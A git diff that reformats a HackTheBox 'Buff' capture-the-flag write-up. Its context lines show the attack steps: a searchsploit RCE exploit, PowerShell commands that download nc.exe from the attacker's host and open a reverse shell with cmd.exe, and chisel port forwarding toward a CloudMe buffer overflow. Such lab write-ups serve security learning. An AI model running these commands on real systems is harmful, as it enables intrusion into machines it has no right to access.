@@ -27,11 +27,12 @@ tags:
 
 
 ## Summary
-Buff is an easy Windows machine provided by egotisticalSW on hackthebox. We are provided with a vulnerable **Gym Management System** for the initial Foothold where we use a RCE vulnerability to gain a low-privileged shell. For root We exploit a target (**CloudMe**) which is vulnerable to Buffer Overflow.
+Buff is an easy Windows machine provided by egotisticalSW on hackthebox. 
+We are provided with a vulnerable **Gym Management System** for the initial Foothold where we use a RCE vulnerability to gain a low-privileged shell. 
+For root We exploit a target (**CloudMe**) which is vulnerable to Buffer Overflow.
 
 ## Enumeration
 Using our very first usual information , which is the machine's IP (**10.10.10.198**) , we begin to enumerate with a **nmap** scan
-
 ### nmap
 
 ```sh
@@ -53,13 +54,13 @@ Only port **8080** shows opened which appears to be a WebServer holding the titl
 
 ### Webpage
 
-The webpage represents somewhat of a fitness page with a login option.
+The website represents somewhat of a fitness page with a login option.
 
 ![webpage](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/webpage.png)
 
 Clicking on **Contact** button reveals useful information.
 
-The website has been built using **Gym Management Software 1.0** :
+The website has been built using ***Gym Management Software 1.0*** :
 
 ![contact](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/contact.png)
 
@@ -69,7 +70,7 @@ While searching the software on **exploitdb** We find a RCE vulnerability ...
 
 ![exploitdb](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/master/assets/images/buff-writeup/exploitdb.png)
 
-I am going to use the 4th exploit which appears to be an **Unauthenticated Remote Code Execution** Vulnerability.
+I am going to use the 4th exploit which appears to be an ***Unauthenticated Remote Code Execution*** Vulnerability.
 
 ```sh
 root@kali:~# searchsploit -m /usr/share/exploitdb/exploits/php/webapps48506.py
@@ -105,7 +106,7 @@ Using python3 **http.server** I can host a copy of netcat.exe which is located o
 
 On the remote machine I can use the following commands to download and execute netcat in order to give myself a reverse shell :
 
-```sh
+```
 C:\xampp\htdocs\gym\upload> powershell -c "curl.exe http://10.10.14.127/nc.exe -o netcat.exe" 
 C:\xampp\htdocs\gym\upload> netcat.exe 10.10.14.127 9001 -e cmd.exe
 ```
@@ -118,7 +119,7 @@ After a while listening , I recieve a reverse shell :
 
 While enumerating the box I came across an interesting **.exe** file under ``C:\Users\shaun\Downloads`` :
 
-```cmd
+```
 C:\Users\shaun\Documents>cd ../Downloads
 cd ../Downloads
 
@@ -142,7 +143,7 @@ Again , searching the software on **exploitdb** for a possible vulnerability lea
 
 By the first view, it seems like a **Buffer Overflow** vulnerability laying on **CloudMe** which should probably be listening on a local port on the machine. 
 We can confirm that by executing this command :
-```cmd
+```
 C:\Users\shaun\Downloads>netstat -an | findstr "LISTENING"
 
   TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
@@ -173,7 +174,7 @@ root@kali:~# chisel server -p 9999 --reverse
 2020/11/22 16:57:19 server: Listening on http://0.0.0.0:9999
 ```
 Next, on the target machine where **chisel** will act as a client I'll fire the following command :
-```cmd
+```
 C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.127:9999 R:8888:127.0.0.1:8888
 2020/11/22 16:07:14 client: Connecting to ws://10.10.14.127:9999
 2020/11/22 16:07:14 client: Fingerprint 3e:9b:22:0a:bc:86:88:37:da:bc:fe:ff:13:89:a9:20
